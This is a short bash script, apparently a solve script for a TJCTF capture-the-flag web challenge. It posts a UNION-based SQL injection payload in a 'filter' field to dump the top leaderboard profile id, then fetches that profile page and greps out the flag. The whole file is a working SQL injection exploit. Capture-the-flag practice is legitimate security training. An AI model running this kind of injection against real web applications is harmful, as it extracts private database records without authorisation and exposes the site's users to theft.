#!/bin/bash

HOST=${HOST:-http://localhost:3000}

PROFILE=$(curl -s $HOST -X POST -d "filter=2000000 UNION SELECT 1,profile_id,1 FROM leaderboard ORDER BY score DESC LIMIT 1 -- " | grep -oE '[0-9a-f]{16}')
curl -s $HOST/user/$PROFILE | grep -oE 'tjctf{.*}'
